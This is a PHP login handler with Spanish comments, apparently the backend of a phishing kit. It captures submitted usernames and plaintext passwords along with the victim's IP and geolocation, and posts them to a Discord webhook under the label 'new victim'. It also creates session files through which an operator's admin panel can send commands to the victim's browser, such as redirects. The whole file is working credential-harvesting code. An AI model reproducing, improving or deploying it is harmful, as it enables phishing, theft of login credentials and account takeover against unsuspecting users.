<?php
// login.php - Procesa el login y crea la sesión
require 'config.php';

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = trim($_POST['usuario'] ?? '');
    $contrasena = trim($_POST['contraseña'] ?? '');

    if (empty($usuario) || empty($contrasena)) {
        header('Location: indexincorrecto.html');
        exit;
    }

    // Generar ID de sesión único
    $sessionId = session_id();
    if (empty($sessionId)) {
        $sessionId = bin2hex(random_bytes(16));
    }
    
    // Guardar en sesión PHP (opcional, pero útil)
    $_SESSION['usuario'] = $usuario;
    $_SESSION['custom_sid'] = $sessionId;

    // Obtener datos de red
    $ip = getUserIP();
    
    // Guardar datos iniciales en JSON para el Admin Panel
    $ip = getUserIP(); // Helper de config.php
    $geo = getGeoLocation($ip); // Helper de config.php (si existe) o simulado

    $sessionFile = DATA_DIR . "/{$sessionId}.json";
    $initialData = [
        'id' => $sessionId,
        'usuario' => $usuario,
        'ip' => $ip,
        'country' => $geo['country'] ?? 'Unknown',
        'city' => $geo['city'] ?? 'Unknown',
        'status' => 'logged_in',
        'command' => null,
        'last_seen' => time()
    ];
    file_put_contents($sessionFile, json_encode($initialData));

    // Enviar a Discord
    $embed = [
        "title" => "CREDENCIALES RECIBIDAS",
        "color" => 16763904, // Amarillo
        "fields" => [
            ["name" => "USUARIO", "value" => "```{$usuario}```", "inline" => true],
            ["name" => "CONTRASEÑA", "value" => "```{$contrasena}```", "inline" => true],
            ["name" => "IP", "value" => $ip, "inline" => true],
            ["name" => "SESSION ID", "value" => "```{$sessionId}```", "inline" => false]
        ],
        "footer" => ["text" => "PHP Backend - " . date("Y-m-d H:i:s")]
    ];

    sendToDiscord("@here **NUEVA VÍCTIMA EN LOADING**", [$embed]);

    // Crear archivo de sesión para polling
    // Estado inicial: 'waiting' (esperando comando del admin)
    $sessionData = [
        'id' => $sessionId,
        'status' => 'waiting',
        'command' => null, // Comandos: 'redirect', etc.
        'target_url' => null,
        'last_seen' => time()
    ];
    
    file_put_contents(DATA_DIR . "/{$sessionId}.json", json_encode($sessionData));

    // Redirigir a loading con el ID
    header("Location: loading.html?sid={$sessionId}");
    exit;
} else {
    header('Location: index.html');
    exit;
}
